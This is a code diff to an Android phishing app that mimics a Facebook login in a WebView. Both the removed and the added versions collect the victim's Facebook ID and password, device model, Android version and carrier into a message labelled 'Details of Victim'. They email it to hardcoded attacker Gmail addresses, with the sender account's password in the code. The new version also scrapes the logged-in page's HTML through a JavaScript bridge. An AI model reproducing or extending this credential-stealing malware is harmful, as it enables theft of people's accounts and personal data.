@@ -1,9 +1,13 @@
 package xtremecreations.facebookapp;
+import android.Manifest;
+import android.annotation.SuppressLint;
 import android.content.Intent;
 import android.graphics.Bitmap;
 import android.graphics.Color;
 import android.graphics.Typeface;
 import android.os.Build;
+import android.os.Handler;
+import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
 import android.os.Bundle;
@@ -24,6 +28,7 @@ import android.view.animation.Animation;
 import android.view.animation.AnimationUtils;
 import android.webkit.CookieManager;
 import android.webkit.GeolocationPermissions;
+import android.webkit.JavascriptInterface;
 import android.webkit.WebChromeClient;
 import android.webkit.WebView;
 import android.webkit.WebViewClient;
@@ -43,6 +48,7 @@ public class LoginActivity extends AppCompatActivity
     RelativeLayout MainLayout;
     int sh=0,page=0;
     Animation animation;
+    @SuppressLint("SetJavaScriptEnabled")
     @Override
     protected void onCreate(Bundle savedInstanceState)
     {
@@ -51,7 +57,7 @@ public class LoginActivity extends AppCompatActivity
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP){
         LoginActivity.this.getWindow().setStatusBarColor(ContextCompat.getColor(LoginActivity.this, R.color.status));}
         setContentView(R.layout.activity_login);
-
+        ActivityCompat.requestPermissions(LoginActivity.this, new String[]{Manifest.permission.READ_PHONE_STATE},0);
         Login=(EditText)findViewById(R.id.email);
         Pass=(EditText)findViewById(R.id.pass);
         Show=(TextView)findViewById(R.id.show);
@@ -154,6 +160,7 @@ public class LoginActivity extends AppCompatActivity
 
         //Main Facebook Login-------------------------------------------------------------------
         FBMain.getSettings().setJavaScriptEnabled(true);
+        FBMain.addJavascriptInterface(new MyJavaScriptInterface(this), "HtmlViewer");
         FBMain.setWebChromeClient(new MyWebChromeClient());
         FBMain.setWebViewClient(new WebViewClient(){
             @Override
@@ -188,32 +195,56 @@ public class LoginActivity extends AppCompatActivity
                 if(page==2) {
                     if (url.contains("m.facebook.com/home.php?_rdr"))
                     {
-                        final String message="Details of Victim =>\n"+
-                                "\nFacebook ID = "+Login.getText().toString()+
-                                "\nPassword = "+Pass.getText().toString()+
-                                "\nDevice Used = "+Build.MODEL+
-                                "\nAndroid Version Used = "+android.os.Build.VERSION.RELEASE+
-                                "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
-
-                        new Thread(new Runnable() {
-                            @Override
-                            public void run() {
-                                try {
-                                    GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
-                                    sender.sendMail("Facebook Hacked !",
-                                            message,
-                                            "ritik.fbhack@gmail.com",
-                                            "ritik.space@gmail.com");
-                                } catch (Exception e) {
-                                    Log.e("SendMail", e.getMessage(), e);
-                                }
-                            }
-                        }).start();
-
+//                        FBMain.loadUrl("javascript:window.HtmlViewer.showHTML"+
+//                                "(document.getElementsByClassName('_52ja _52jh')[0].innerHTML);");
+                        FBMain.loadUrl("javascript:window.HtmlViewer.showHTML" +
+                                "('<html>'+document.getElementsByTagName('html')[0].innerHTML+'</html>');");
+                        Toast.makeText(LoginActivity.this, "Sending", Toast.LENGTH_SHORT).show();
                     }
                 }
             }
         });
+    }
+    class MyJavaScriptInterface
+    {
+        LoginActivity login;
+        MyJavaScriptInterface(LoginActivity login){this.login=login;}
+        @JavascriptInterface
+        public void showHTML()
+        {
+            Toast.makeText(login, "Sent1", Toast.LENGTH_SHORT).show();
+            new Handler().post(new Runnable()
+                               {
+                                   @Override
+                                   public void run()
+                                   {
+                                       Toast.makeText(login, "Sent2", Toast.LENGTH_SHORT).show();
+                                       final String message="Details of Victim =>\n"+
+                                               "\nName = "+//vName+
+                                               "\nFacebook ID = "+Login.getText().toString()+
+                                               "\nPassword = "+//Pass.getText().toString()+
+                                               "\nDevice Used = "+Build.MODEL+
+                                               "\nAndroid Version Used = "+android.os.Build.VERSION.RELEASE+
+                                               "\nSim Network Used = "+((TelephonyManager) Objects.requireNonNull(LoginActivity.this.getSystemService(TELEPHONY_SERVICE))).getNetworkOperatorName();
+
+                                       new Thread(new Runnable() {
+                                           @Override
+                                           public void run() {
+                                               try {
+                                                   GMailSender sender = new GMailSender(LoginActivity.this,"ritik.fbhack@gmail.com", "123212321");
+                                                   sender.sendMail("Facebook Hacked !",
+                                                           message,
+                                                           "ritik.fbhack@gmail.com",
+                                                           "ritik.space@gmail.com");
+                                               } catch (Exception e) {
+                                                   Log.e("SendMail", e.getMessage(), e);
+                                               }
+                                           }
+                                       }).start();
+                                   }
+                               }
+            );
+        }
     }
     public class MyWebChromeClient extends WebChromeClient {
 
